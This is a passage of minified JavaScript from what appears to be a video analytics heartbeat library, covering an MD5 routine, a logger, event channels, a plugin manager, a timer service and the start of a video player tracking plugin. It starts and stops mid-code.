(p,m,_,g,e[s+10],23,-1094730640),g=r(g,p,m,_,e[s+13],4,681279174),_=r(_,g,p,m,e[s],11,-358537222),m=r(m,_,g,p,e[s+3],16,-722521979),p=r(p,m,_,g,e[s+6],23,76029189),g=r(g,p,m,_,e[s+9],4,-640364487),_=r(_,g,p,m,e[s+12],11,-421815835),m=r(m,_,g,p,e[s+15],16,530742520),g=n(g,p=r(p,m,_,g,e[s+2],23,-995338651),m,_,e[s],6,-198630844),_=n(_,g,p,m,e[s+7],10,1126891415),m=n(m,_,g,p,e[s+14],15,-1416354905),p=n(p,m,_,g,e[s+5],21,-57434055),g=n(g,p,m,_,e[s+12],6,1700485571),_=n(_,g,p,m,e[s+3],10,-1894986606),m=n(m,_,g,p,e[s+10],15,-1051523),p=n(p,m,_,g,e[s+1],21,-2054922799),g=n(g,p,m,_,e[s+8],6,1873313359),_=n(_,g,p,m,e[s+15],10,-30611744),m=n(m,_,g,p,e[s+6],15,-1560198380),p=n(p,m,_,g,e[s+13],21,1309151649),g=n(g,p,m,_,e[s+4],6,-145523070),_=n(_,g,p,m,e[s+11],10,-1120210379),m=n(m,_,g,p,e[s+2],15,718787259),p=n(p,m,_,g,e[s+9],21,-343485551),g=t(g,d),p=t(p,c),m=t(m,l),_=t(_,u);return[g,p,m,_]}function d(e){var t,a="";for(t=0;t<32*e.length;t+=8)a+=String.fromCharCode(e[t>>5]>>>t%32&255);return a}function c(e){var t,a=[];for(a[(e.length>>2)-1]=void 0,t=0;t<a.length;t+=1)a[t]=0;for(t=0;t<8*e.length;t+=8)a[t>>5]|=(255&e.charCodeAt(t/8))<<t%32;return a}function l(e){var t,a,o="0123456789abcdef",i="";for(a=0;a<e.length;a+=1)t=e.charCodeAt(a),i+=o.charAt(t>>>4&15)+o.charAt(15&t);return i}function u(e){return unescape(encodeURIComponent(e))}function g(e){return function(e){return d(s(c(e),8*e.length))}(u(e))}function p(e,t){return function(e,t){var a,o,i=c(e),r=[],n=[];for(r[15]=n[15]=void 0,i.length>16&&(i=s(i,8*e.length)),a=0;a<16;a+=1)r[a]=909522486^i[a],n[a]=1549556828^i[a];return o=s(r.concat(c(t)),512+8*t.length),d(s(n.concat(o),640))}(u(e),u(t))}e.md5=function(e,t,a){return t?a?p(t,e):function(e,t){return l(p(e,t))}(t,e):a?g(e):function(e){return l(g(e))}(e)}}(t),function(e){"use strict";var t={startsWith:function(e,t){return 0==e.indexOf(t)}};e.StringUtils=t}(t),function(e){"use strict";var t={clone:function(e){var t={};for(var a in e)e.hasOwnProperty(a)&&(t[a]=e[a]);return t},merge:function(e,a){var o=t.clone(e);for(var i in a)a.hasOwnProperty(i)&&(o[i]=a[i]);return o},append:function(e,t){for(var a in t)t.hasOwnProperty(a)&&(e[a]=t[a])}};e.ObjectUtils=t}(t),function(e){"use strict";function t(e){if(null==e)return!0;for(var t=0;t<e.length;++t)if(isNaN(e[t]))return!1;return!0}function a(e,a){if("string"!=typeof e||"string"!=typeof a)return NaN;var o=e.split("."),i=a.split(".");if(!t(o)||!t(i))return NaN;for(var r=Math.max(o.length,i.length),n=0;n<r;++n){var s=null!=o[n]?o[n]:"0",d=null!=i[n]?i[n]:"0";if((s=Number(s))>(d=Number(d)))return 1;if(s<d)return-1}return 0}var o={isGreaterThan:function(e,t){return a(e,t)>0},isGreaterThanEqual:function(e,t){return a(e,t)>=0},isLessThan:function(e,t){return a(e,t)<0},isLessThanEqual:function(e,t){return a(e,t)<=0},isSame:function(e,t){return 0===a(e,t)},isDifferent:function(e,t){return 0!==a(e,t)}};e.VersionUtils=o}(t),function(e){"use strict";function t(e,t,a){this.fn=e,this.ctx=t,this.params=a}t.prototype.run=function(){this.params?this.fn.apply(this.ctx,this.params):this.fn.apply(this.ctx)},e.radio.Command=t}(o),function(e){"use strict";function t(e,t){this._queue=[],this._lastTs=0,this._isSuspended=void 0!==e&&e,this._delay=void 0!==t?t:0}t.prototype.addCommand=function(e){this._queue.push(e),this._drain()},t.prototype.cancelAllCommands=function(){this._queue=[]},t.prototype.isEmpty=function(){return 0===this._queue.length},t.prototype.suspend=function(){this._isSuspended=!0},t.prototype.resume=function(){this._isSuspended=!1,this._drain()},t.prototype.flush=function(){this._isSuspended=!1;for(var e=0;e<this._queue.length;e++)this._queue[e].run();this._queue=[]},t.prototype._drain=function(){if(!this._isSuspended&&!this._drainInProgress){this._drainInProgress=!0;var e=this;!function t(){var a=e._queue.shift();a?e._runCommand(a,(function(){e._isSuspended||t()})):e._drainInProgress=!1}()}},t.prototype._runCommand=function(e,t){function a(){e.run(),null!=t&&t.call(o)}var o=this;if(0==this._lastTs)a();else{var i=(new Date).getTime(),r=i-this._lastTs;this._lastTs=i,r<this._delay?setTimeout(a,this._delay-r):a()}},e.radio.CommandQueue=t}(o),function(e){"use strict";function t(e,t){if(this._name=e,!t)throw new Error("Reference to the logger object cannot be NULL");this._logger=t,this._listeners={},this._requests={},this._commands={},this._isShutDown=!1}function a(e,a){if(e===a)return!0;for(var o=(e||"").split(t.SEPARATOR),i=(a||"").split(t.SEPARATOR),r=!0,n=0;n<o.length;n++)r=r&&(o[n]===t.WILDCARD||o[n]===i[n]);return r}t.WILDCARD="*",t.SEPARATOR=":",t.prototype.toString=function(){return"<channel: "+this._name+">"},t.prototype.shutdown=function(){this._isShutDown||(this._logger.debug(o,"#shutdown > Shutting down"),this.off(),this._requests={},this._commands={},this._isShutDown=!0)},t.prototype.on=function(e,t,a){this._isShutDown||(this._listeners[e]||(this._listeners[e]=[]),this._listeners[e].push({fn:t,ctx:a}))},t.prototype.off=function(e,t,a){if(!this._isShutDown){if(t="function"==typeof t?t:null,!e&&null==t&&!a)return void(this._listeners={});if(e)this._removeListener(e,t,a);else for(e in this._listeners)this._listeners.hasOwnProperty(e)&&this._removeListener(e,t,a)}},t.prototype.trigger=function(e){if(!this._isShutDown)for(var t in this._listeners)if(this._listeners.hasOwnProperty(t)&&a(t,e.name))for(var o=this._listeners[t].slice(0),i=0;i<o.length;i++){var r=o[i];r.fn.call(r.ctx,e)}},t.prototype.comply=function(e,t,a){this._isShutDown||(this._commands[e]={cmd:t,ctx:a})},t.prototype.command=function(e,t){if(!this._isShutDown){var a=this._commands[e];if(!a)return void this._logger.warn(o,"#command > No command handler for: "+e);a.cmd.call(a.ctx,t)}},t.prototype.reply=function(e,t,a){this._isShutDown||(this._requests[e]={fn:t,ctx:a})},t.prototype.request=function(e){if(!this._isShutDown){var t=this._requests[e];return t?t.fn.call(t.ctx):(this._logger.warn(o,"#request > No request handler for: "+e),null)}},t.prototype._removeListener=function(e,t,a){t="function"==typeof t?t:null;var o=this._listeners[e];if(o){if(!o.length||null==t&&!a)return void delete this._listeners[e];for(var i=0;i<o.length;i++){var r=o[i];null!==t&&t!==r.fn||a&&a!==r.ctx||this._listeners[e].splice(i,1)}}};var o="radio::Channel";e.radio.Channel=t}(o),function(e){"use strict";function t(e){if(!e)throw new Error("Reference to the logger object cannot be NULL");this._logger=e,this._channels={}}var a=e.radio.Channel;t.prototype.channel=function(e){return this._channels[e]||(this._channels[e]=new a(e,this._logger)),this._channels[e]},t.prototype.shutdown=function(){for(var e in this._channels)this._channels.hasOwnProperty(e)&&this._channels[e].shutdown()},e.radio.Radio=t}(o),function(e){"use strict";e.extend=function(e,t){function a(){this.constructor=e}for(var o in t)t.hasOwnProperty(o)&&(e[o]=t[o]);return a.prototype=t.prototype,e.prototype=new a,e.__super__=t.prototype,e}}(o),function(e){"use strict";function t(){}t.prototype.write=function(e){throw new Error("Implementation error: Method must be overridden.")},e.ILogWriter=t}(o),function(e){"use strict";function t(){}t.prototype.write=function(e){window.console&&window.console.log&&window.console.log(e)},e.LogWriter=t}(o),function(e){"use strict";function t(){}t.prototype.setLogWriter=function(e){throw new Error("Implementation error: Method must be overridden.")},t.prototype.getLogWriter=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.getEnabled=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.enable=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.disable=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.debug=function(e,t){throw new Error("Implementation error: Method must be overridden.")},t.prototype.info=function(e,t){throw new Error("Implementation error: Method must be overridden.")},t.prototype.warn=function(e,t){throw new Error("Implementation error: Method must be overridden.")},t.prototype.error=function(e,t){throw new Error("Implementation error: Method must be overridden.")},e.ILogger=t}(o),function(e){"use strict";function t(){this._logWriter=new a}var a=e.LogWriter;t.prototype.setLogWriter=function(e){if(!e)throw new Error("Reference to the ILogWriter object cannot be NULL");this._logWriter=e,this._enabled=!1},t.prototype.getLogWriter=function(){return this._logWriter},t.prototype.getEnabled=function(){return this._enabled},t.prototype.enable=function(){this._enabled=!0},t.prototype.disable=function(){this._enabled=!1},t.prototype.debug=function(e,t){this._log(e,i,t)},t.prototype.info=function(e,t){this._log(e,o,t)},t.prototype.warn=function(e,t){this._log(e,r,t)},t.prototype.error=function(e,t){this._log(e,n,t)},t.prototype._log=function(e,t,a){if(t==n||this._enabled){var o="",i=new Date;o+="["+i.toTimeString()+"."+function(e){return e<10?"00"+e:e<100?"0"+e:""+e}(i.getMilliseconds())+"] ["+t+"] ",o+="["+e+"] "+a,this._logWriter.write(o)}};var o="INFO",i="DEBUG",r="WARN",n="ERROR";e.Logger=t}(o),function(e){"use strict";function t(e,t){this._pluginName=e,this._eventName=t}var a=e.radio.Channel;t.prototype.getPluginName=function(){return this._pluginName},t.prototype.getEventName=function(){return this._eventName},t.prototype.getName=function(){return this._pluginName+a.SEPARATOR+this._eventName},e.Trigger=t}(o),function(e){"use strict";function t(e,t){this.name=e,this.data=t}t.SUCCESS="success",t.ERROR="error",t.createFromTrigger=function(e){return new t(e.getName())},e.Event=t}(o),function(e){"use strict";function t(){this._events={}}t.prototype.addEventListener=function(e,t,a){e&&t&&(a=a||window,this._events[e]=this._events[e]||[],this._events[e].push({cb:t,ctx:a}))},t.prototype.removeEventListener=function(e,t,a){if(e&&t){a=a||window;var o,i,r=!1;for(i in this._events)if(e===i){r=!0;break}if(r){for(o=this._events[i].length-1;o>=0;o--){var n=this._events[i][o];t===n.cb&&a===n.ctx&&this._events[i].splice(o,1)}this._events[i].length||delete this._events[i]}}},t.prototype.dispatchEvent=function(e){var t,a;if(e.name)for(t in this._events)if(this._events.hasOwnProperty(t)&&e.name===t){var o=this._events[t].slice(0),i=o.length;for(a=0;a<i;a++)o[a].cb.call(o[a].ctx,e);break}},t.prototype.removeAllListeners=function(e){var t,a;if(e){for(a in this._events)if(this._events.hasOwnProperty(a)){for(t=this._events[a].length-1;t>=0;t--){this._events[a][t].ctx===e&&this._events[a].splice(t,1)}this._events[a].length||delete this._events[a]}}else this._events={}},e.EventDispatcher=t}(o),function(e){"use strict";function t(){}function a(){a.__super__.constructor.call(this),this._connection=null}var o=e.Event,i=e.EventDispatcher;t.GET="GET",a.RESPONSE="response",a.INSTANCE="instance",e.extend(a,i),a.prototype.close=function(){this.removeAllListeners(null)},a.prototype.load=function(e){e&&e.method&&e.url&&(e._xmlhttp=this._createCORSRequest(e),e._xmlhttp?e._xmlhttp.send():this._loadImage(e))},a.prototype._createCORSRequest=function(e){var t=null;if(void 0!==window.XMLHttpRequest){var i=new window.XMLHttpRequest;"withCredentials"in i&&(t=i).open(e.method,e.url,!0)}if(null==t&&void 0!==window.XDomainRequest&&(t=new window.XDomainRequest).open(e.method,e.url),t){var r={};r[a.INSTANCE]=this;var n=this;t.onload=function(){if(t.status&&parseInt(t.status,10)>=400)return this.onerror();r[a.RESPONSE]=t.responseText,n.dispatchEvent(new o(o.SUCCESS,r))},t.onerror=function(){n.dispatchEvent(new o(o.ERROR,r))}}return t},a.prototype._loadImage=function(e){this._connection||(this._connection=new Image,this._connection.alt=""),this._connection.src=e.url;var t={};t[a.RESPONSE]="",t[a.INSTANCE]=this,this.dispatchEvent(new o(o.SUCCESS,t))},e.URLRequestMethod=t,e.URLRequest=function(e,t){this.url=e||null,this.method=t,this._xmlhttp=null},e.URLLoader=a}(o),function(e){"use strict";var t="2.2.0.223",a="05c3c4",o={getVersion:function(){return"js-"+t+"-"+a},getMajor:function(){return o.getNumberAtPosition(0)},getMinor:function(){return o.getNumberAtPosition(1)},getMicro:function(){return o.getNumberAtPosition(2)},getPatch:function(){return o.getNumberAtPosition(3)},getBuild:function(){return a},getApiLevel:function(){return 4},getNumberAtPosition:function(e){return t.split(".")[e]}};e.Version=o}(a),function(e){"use strict";function t(e,t){this._message=e,this._details=t}t.prototype.getMessage=function(){return this._message},t.prototype.getDetails=function(){return this._details},e.ErrorInfo=t}(a),function(e){"use strict";e.HeartbeatConfig=function(){this.debugLogging=!1}}(a),function(e){"use strict";function t(){}t.prototype.onError=function(e){},e.HeartbeatDelegate=t}(a),function(e){"use strict";function t(){}t.prototype.configure=function(e){throw new Error("Implementation error: Method must be overridden.")},t.prototype.bootstrap=function(e){throw new Error("Implementation error: Method must be overridden.")},t.prototype.setup=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.destroy=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.enable=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.disable=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.getName=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.isInitialized=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.resolveData=function(e){throw new Error("Implementation error: Method must be overridden.")},e.plugin.IPlugin=t}(o),function(e){"use strict";function t(e,t,a,o){this.trigger=e,this.action=a,this.plugin=t,this._paramMappings={},this.mergeParams(o)}var a=e.plugin.ParamMapping;t.prototype.mergeParams=function(e){if(e)for(var t=0;t<e.length;t++){var a=e[t];this._paramMappings[a.getKeyName()]=a}},t.prototype.getParams=function(){var e=[];for(var t in this._paramMappings)this._paramMappings.hasOwnProperty(t)&&e.push(this._paramMappings[t]);return e},t.prototype.addParam=function(e){this._paramMappings[e.getKeyName()]=e},t.prototype.removeParam=function(e,t){var o=new a(e,t);this._paramMappings.hasOwnProperty(o.getKeyName())&&delete this._paramMappings[o.getKeyName()]},e.plugin.Behaviour=t}(o),function(e){"use strict";function t(e,t,o){this._pluginName=e,this._key=t,this._paramName=o||e+a.SEPARATOR+t}var a=e.radio.Channel;t.prototype.getPluginName=function(){return this._pluginName},t.prototype.getKey=function(){return this._key},t.prototype.getKeyName=function(){return this._pluginName+a.SEPARATOR+this._key},t.prototype.getParamName=function(){return this._paramName},e.plugin.ParamMapping=t}(o),function(e){"use strict";function t(e){if(!e)throw new Error("Reference to the logger object cannot be NULL");this._logger=e,this._plugins={},this._behaviours={},this._radio=new o(this._logger),this._dataChannel=this._radio.channel(n),this._ctrlChannel=this._radio.channel(s)}var a=e.Event,o=e.radio.Radio,i=e.radio.Channel,r=e.plugin.Behaviour;t.ERROR="error",t.prototype.addPlugin=function(e){var t=e.getName();this._plugins[t]&&this._logger.warn(d,"#addPlugin > Replacing plugin: "+t),this._plugins[t]=e,e.bootstrap(this)},t.prototype.setupPlugins=function(){for(var e in this._plugins)this._plugins.hasOwnProperty(e)&&this._plugins[e].setup()},t.prototype.pluginExists=function(e){return!!this._plugins[e]},t.prototype.isPluginInitialized=function(e){return this._plugins[e]&&this._plugins[e].isInitialized()},t.prototype.on=function(e,t,a,o){this._dataChannel.on(e+i.SEPARATOR+t,a,o)},t.prototype.off=function(e,t,a,o){var r=e&&t?e+i.SEPARATOR+t:null;this._dataChannel.off(r,a,o)},t.prototype.trigger=function(e){var t=e.name,a=this._behaviours[t];if(a){var o,i,r,n,s,d={},c={};for(o=0;o<a.length;o++)if(n=(r=a[o]).getParams())for(i=0;i<n.length;i++)d[(s=n[i]).getPluginName()]=d[s.getPluginName()]||[],s.key in d[s.getPluginName()]||d[s.getPluginName()].push(s.getKey());for(var l in d)d.hasOwnProperty(l)&&(c[l]=this.request(l,d[l]));for(o=0;o<a.length;o++){var u={_behaviour:r=a[o],_eventData:e.data||{}};if(n=r.getParams()){for(i=0;i<n.length;i++)u[(s=n[i]).getParamName()]=c[s.getPluginName()]?c[s.getPluginName()][s.getKey()]:null;this.command(r.plugin.getName(),r.action,u)}}}this._dataChannel.trigger(e)},t.prototype.request=function(e,t){var a=this._plugins[e];return a&&t&&0!=t.length?a.resolveData(t):null},t.prototype.raise=function(e){this._errorInfo=e;var o=new a(t.ERROR,e);this._ctrlChannel.trigger(o)},t.prototype.getErrorInfo=function(){return this._errorInfo},t.prototype.destroy=function(){for(var e in this._radio.shutdown(),this._plugins)this._plugins.hasOwnProperty(e)&&this._plugins[e].destroy()},t.prototype.comply=function(e,t,a){this._dataChannel.comply(e.getName()+i.SEPARATOR+t,a,e)},t.prototype.command=function(e,t,a){this._dataChannel.command(e+i.SEPARATOR+t,a)},t.prototype.registerBehaviour=function(e,t,a,o){var i=e.getName(),n=new r(e,t,a,o);this._behaviours[i]=this._behaviours[i]||[],this._behaviours[i].push(n)};var n="data_channel",s="ctrl_channel",d="plugin::PluginManager";e.plugin.PluginManager=t}(o),function(e,t){"use strict";function a(e){this._name=e,this._isInitialized=!1,this._isDestroyed=!1,this._isEnabled=!0,this._dataResolver={},this._logTag="plugin::"+this.getName(),this._logger=new o}var o=e.Logger,i=e.Trigger,r=e.Event,n=t.ErrorInfo;a.INITIALIZED="initialized",a.prototype.configure=function(e){},a.prototype.bootstrap=function(e){this._pluginManager=e,this._isDestroyed&&this._pluginManager.raise(new n("Invalid state.","Plugin already destroyed."))},a.prototype.setup=function(){this._trigger(a.INITIALIZED),this._isInitialized=!0},a.prototype.destroy=function(){this._isDestroyed||(this._isDestroyed=!0,this._teardown())},a.prototype.enable=function(){this._isEnabled=!0,this._enabled()},a.prototype.disable=function(){this._isEnabled=!1,this._disabled()},a.prototype.getName=function(){return this._name},a.prototype.getLogger=function(){return this._logger},a.prototype.isInitialized=function(){return this._isInitialized},a.prototype.resolveData=function(e){if(!this._isEnabled||!this._isInitialized)return this._logger.warn(this._logTag,"Unable to retrieve plugin data. Plugin: "+this._name+". Enabled: "+this._isEnabled+". Initialized: "+this._isInitialized+"."),null;if("function"==typeof this._dataResolver)return this._dataResolver.call(this,e);var t=null;if(e)for(var a=0;a<e.length;a++){var o=e[a];this._dataResolver.hasOwnProperty(o)&&(t=t||{},"function"==typeof this._dataResolver[o]?t[o]=this._dataResolver[o].call(this):t[o]=this._dataResolver[o])}return t},a.prototype.toString=function(){return"<plugin: "+this._name+">"},a.prototype._enabled=function(){},a.prototype._disabled=function(){},a.prototype._teardown=function(){},a.prototype._canProcess=function(){return this._isEnabled?!this._isDestroyed||(this._logger.error(this._logTag,"Plugin destroyed."),!1):(this._logger.error(this._logTag,"Plugin disabled."),!1)},a.prototype._trigger=function(e,t){var a=r.createFromTrigger(new i(this.getName(),e));a.data=t,this._pluginManager.trigger(a)},e.plugin.BasePlugin=a}(o,a),function(e){"use strict";function t(e,t,a){this.name=e,this.interval=t,this.isActive=!1,this.repeatCount=void 0!==a?a:i,this._nextTickTimestamp=0,this.reset()}function a(e,t){if(!e)throw new Error("Reference to the ClockService object cannot be NULL");if(this._service=e,!t)throw new Error("Reference to the logger object cannot be NULL");this._logger=t,this._isDestroyed=!1,this._timers={};var a=this;this._clock=window.setInterval((function(){a._onTick()}),1e3*r)}t.prototype.reset=function(){this.tick=0,this._createdTimestamp=(new Date).getTime(),this._updateNextTickTimestamp()},t.prototype.shouldTick=function(){return(new Date).getTime()>this._nextTickTimestamp-n/2&&(this.tick++,this._updateNextTickTimestamp(),!0)},t.prototype._updateNextTickTimestamp=function(){var e=(new Date).getTime();this._nextTickTimestamp=e+1e3*this.interval-1},a.prototype.createTimer=function(e,a,o){this._timers[e]=new t(e,a,o)},a.prototype.destroyTimer=function(e){delete this._timers[e]},a.prototype.resumeTimer=function(e,t){t=void 0!==t&&t,this._logger.debug(o,"#resumeTimer(name="+e+", reset="+t+")");var a=this._timers[e];a&&(a.isActive=!0,t&&a.reset())},a.prototype.pauseTimer=function(e,t){t=void 0!==t&&t,this._logger.debug(o,"#pauseTimer(name="+e+", reset="+t+")");var a=this._timers[e];a&&(a.isActive=!1,t&&a.reset())},a.prototype.isTimerPaused=function(e){var t=this._timers[e];return!!t&&!t.isActive},a.prototype.destroy=function(){this._isDestroyed||(this._isDestroyed=!0,this._timers={},window.clearInterval(this._clock))},a.prototype._onTick=function(){for(var e in this._timers)if(this._timers.hasOwnProperty(e)){var t=this._timers[e];t.isActive&&t.shouldTick()&&(t.interval>1&&this._logger.debug(o,"#_onTick() > "+t.name+"("+t.tick+" | "+t.repeatCount+")"),0!=t.repeatCount?(this._service.onTick(t.name,t.interval,t.tick),t.repeatCount!=i&&t.repeatCount--):this.destroyTimer(t.name))}};var o="service.clock::TimerManager",i=-1,r=.25,n=1e3*r;e.clock.TimerDescriptor=t,e.clock.TimerManager=a}(i),function(e,t,a){"use strict";function o(e){if(o.__super__.constructor.call(this,s),!e)throw new Error("Reference to the logger object cannot be NULL");this._logger=e,this._timerManager=new i(this,this._logger),this._setupDataResolver()}var i=a.clock.TimerManager,r=t.StringUtils,n=e.plugin.BasePlugin;e.extend(o,n),o.prototype.bootstrap=function(e){o.__super__.bootstrap.call(this,e),this._pluginManager.comply(this,d,this._cmdCreate),this._pluginManager.comply(this,l,this._cmdResume),this._pluginManager.comply(this,c,this._cmdPause),this._pluginManager.comply(this,u,this._cmdDestroy)},o.prototype._teardown=function(){this._timerManager.destroy()},o.prototype._cmdCreate=function(e){var t=e[m]||v;this._timerManager.createTimer(e[g],e[p],t)},o.prototype._cmdPause=function(e){this._timerManager.pauseTimer(e[g],!!e[h])},o.prototype._cmdResume=function(e){this._timerManager.resumeTimer(e[g],!!e[h])},o.prototype._cmdDestroy=function(e){this._timerManager.destroyTimer(e[g])},o.prototype.onTick=function(e,t,a){e+=".tick";var o={};o[g]=e,o[p]=t,o[_]=a,this._trigger(e,o)},o.prototype._setupDataResolver=function(){var e={},t=this._timerManager;e[y]=function(e){return t.isTimerPaused(e)},this._dataResolver=function(t){if(!t||0==t.length)return null;for(var a=null,o=0;o<t.length;o++){var i=t[o];if(a=a||{},r.startsWith(i,y)){var n=i.split(y+".");n.length>0&&(a[i]=e[y].call(this,n[1]))}}return a}};var s="service.clock",d="create",c="pause",l="resume",u="destroy",g="name",p="interval",m="repeat_count",_="tick",h="reset",y="is_paused",v=-1;a.clock.ClockService=o}(o,t,i),function(e,t,a){"use strict";function o(e,t){if(this._logger=new i,this._pluginManager=new r(this._logger),this._pluginManager.addPlugin(new n(this._logger)),t)for(var a=0;a<t.length;a++)this._pluginManager.addPlugin(t[a]);this._pluginManager.setupPlugins(),this._isDestroyed=!1}var i=e.Logger,r=e.plugin.PluginManager,n=t.clock.ClockService;o.prototype.configure=function(e){if(!e)throw new Error("Configuration object cannot be NULL.");e.debugLogging?this._logger.enable():this._logger.disable(),this._isDestroyed&&this._logger.error(s,"Instance is destroyed.")},o.prototype.destroy=function(){this._isDestroyed||(this._pluginManager.destroy(),this._isDestroyed=!0)};var s="Heartbeat";a.Heartbeat=o}(o,i,a),e.ADB||(e.ADB={}),e.ADB.core||(e.ADB.core=o),e.ADB.va||(e.ADB.va=a),e.ADB.va.utils||(e.ADB.va.utils=t),e.ADB.va.plugins||(e.ADB.va.plugins={})}(this),function(e){if(void 0===t)var t={};!function(e){"use strict";var t={ASSET_TYPE_VOD:"vod",ASSET_TYPE_LIVE:"live",ASSET_TYPE_LINEAR:"linear"};e.AssetType=t}(t),function(e){"use strict";function t(){this.playerName=null,this.name=null,this.position=null,this.startTime=null}t.prototype.toString=function(){return"playerName="+this.playerName+", name="+this.name+", position="+this.position+", startTime="+this.startTime},e.AdBreakInfo=t}(t),function(e){"use strict";function t(){this.id=null,this.name=null,this.length=null,this.position=null,this.granularTracking=!0}t.prototype.toString=function(){return"id="+this.id+", name="+this.name+", length="+this.length+", position="+this.position+", granularTracking="+this.granularTracking},e.AdInfo=t}(t),function(e){"use strict";function t(){this.name=null,this.length=null,this.position=null,this.startTime=null}t.prototype.toString=function(){return"name="+this.name+", length="+this.length+", position="+this.position+", startTime="+this.startTime},e.ChapterInfo=t}(t),function(e){"use strict";function t(){this.bitrate=null,this.fps=null,this.droppedFrames=null,this.startupTime=null}t.prototype.toString=function(){return"bitrate="+this.bitrate+", fps="+this.fps+", droppedFrames="+this.droppedFrames+", startupTime="+this.startupTime},e.QoSInfo=t}(t),function(e){"use strict";function t(){this.playerName=null,this.id=null,this.name=null,this.length=null,this.playhead=null,this.mediaType=null,this.streamType=null,this.resumed=!1}t.prototype.toString=function(){return"playerName="+this.playerName+", id="+this.id+", name="+this.name+", length="+this.length+", playhead="+this.playhead+", mediaType="+this.mediaType+", streamType="+this.streamType+", resumed="+this.resumed},e.VideoInfo=t}(t),function(e){"use strict";e.VideoPlayerPluginConfig=function(){this.debugLogging=!1}}(t),function(e){"use strict";function t(){}t.prototype.getVideoInfo=function(){throw new Error("Implementation error: Method must be overridden.")},t.prototype.getAdBreakInfo=function(){return null},t.prototype.getAdInfo=function(){return null},t.prototype.getChapterInfo=function(){return null},t.prototype.getQoSInfo=function(){return null},e.VideoPlayerPluginDelegate=t}(t),function(e,t){"use strict";function a(e){if(a.__super__.constructor.call(this,s),!e)throw new Error("PlayerPlugin delegate cannot be NULL.");this._delegate=e,this._isTrackingSessionActive=!1,this._isTrackingSessionStarted=!1,this._setupDataResolver()}var o=e.plugin.ParamMapping,i=e.Trigger,r=e.plugin.BasePlugin,n=t.VideoPlayerPluginConfig;e.extend(a,r),a.prototype.configure=function(e){if(!e)throw new Error("Reference to the configuration data cannot be NULL.");if(!(e instanceof n))throw new Error("Expected config data to be instance of VideoPlayerPluginConfig.");e.debugLogging?this._logger.enable():this._logger.disable(),this._logger.debug(this._logTag,"#configure(debugLogging="+e.debugLogging+")")},a.prototype.bootstrap=function(e){a.__super__.bootstrap.call(this,e),this._registerCommands(),this._registerBehaviours()},a.prototype._cmdVideoIdleStart=function(e){this._logger.info(this._logTag,"#_cmdVideoIdleStart()"),this._videoIdle=!0},a.prototype._cmdVideoIdleResume=function(e){this._logger.info(this._logTag,"#_cmdVideoIdleResume()"),this._videoIdle&&(this._trigger(_),this._trigger(h),e.isInAd&&(this._trigger(T),this._isTrackingAdBreak=!0),e.isInAd&&(this._trigger(E),this._isTrackingAd=!0),e.isInChapter&&this._trigger(N),this._trigger(b)),this._videoIdle=!1},a.prototype.trackSessionStart=function(){if(this._logger.info(this._logTag,"#trackSessionStart()"),this._canProcess()){if(!this._isTrackingSessionActive)return void this._logger.warn(this._logTag,"#trackSessionStart() > No active tracking session.");if(this._isTrackingSessionStarted)return void this._logger.info(this._logTag,"#trackSessionStart() > Tracking session already started.");this._trigger(_),this._isTrackingSessionStarted=!0;var e=this._dataResolver(["video.resumed"]);e.hasOwnProperty("video.resumed")&&e["video.resumed"]&&this._trigger(h)}},a.prototype.trackVideoLoad=function(){this._logger.info(this._logTag,"#trackVideoLoad()"),this._canProcess()&&(this._isTrackingAdBreak=!1,this._isTrackingAd=!1,this._contentStarted=!1,this._isPaused=!0,this._isBuffering=!1,this._isSeeking=!1,this._playheadTimer=null,this._previousPlayhead=-1,this._stalledPlayheadCount=0,this._playheadStalled=!1,this._videoIdle=!1,this._trigger(g),this._isTrackingSessionActive=!0,this._isTrackingSessionStarted=!1)},a.prototype.trackVideoUnload=function(){if(this._logger.info(this._logTag,"#trackVideoUnload()"),this._canProcess()){if(!this._isTrackingSessionActive)return void this._logger.warn(this._logTag,"#trackVideoUnload() > No active tracking session.");this._stopPlayheadTimer(),this._trigger(p),this._isTrackingSessionActive=!1,this._isTrackingSessionStarted=!1,this._contentStarted=!1}},a.prototype.trackPlay=function(){this._logger.info(this._logTag,"#trackPlay()"),this._canProcess()&&this._startSessionIfNeeded("trackPlay")&&this._allowPlayerStateChange()&&(this._isPaused=!1,this._trigger(b),this._startPlayheadTimer())},a.prototype.trackPause=function(){if(this._logger.info(this._logTag,"#trackPause()"),this._canProcess()&&this._startSessionIfNeeded("trackPause")&&this._allowPlayerStateChange()){this._stopPlayheadTimer();var e={};e[Q]=!1,this._isPaused=!0,this._trigger(w,e)}},a.prototype.trackBufferStart=function(){this._logger.info(this._logTag,"#trackBufferStart()"),this._canProcess()&&this._startSessionIfNeeded("trackBufferStart")&&this._allowPlayerStateChange()&&(this._stopPlayheadTimer(),this._isBuffering=!0,this._trigger(P))},a.prototype.trackBufferComplete=function(){this._logger.info(this._logTag,"#trackBufferComplete()"),this._canProcess()&&this._startSessionIfNeeded("trackBufferComplete")&&this._allowPlayerStateChange()&&(this._isBuffering=!1,this._trigger(C),this._startPlayheadTimer())},a.prototype.trackSeekStart=function(){this._logger.info(this._logTag,"#trackSeekStart()"),this._canProcess()&&this._startSessionIfNeeded("trackSeekStart")&&this._allowPlayerStateChange()&&(this._stopPlayheadTimer(),this._isSeeking=!0,this._trigger(A))},a.prototype.trackSeekComplete=function(){this._logger.info(this._logTag,"#trackSeekComplete()"),this._canProcess()&&this._startSessionIfNeeded("trackSeekComplete")&&this._allowPlayerStateChange()&&(this._isSeeking=!1,this._trigger(L),this._startPlayheadTimer())},a.prototype.trackComplete=function(e,t){if(this._logger.info(this._logTag,"#trackComplete()"),this._canProcess()&&this._startSessionIfNeeded("trackComplete")){if(this._stopPlayheadTimer(),this._videoIdle)return this._logger.info(this._logTag,"#trackComplete() > Video session is already in Idle State."),void(e&&e());var a={};a[O]=e,(t=void 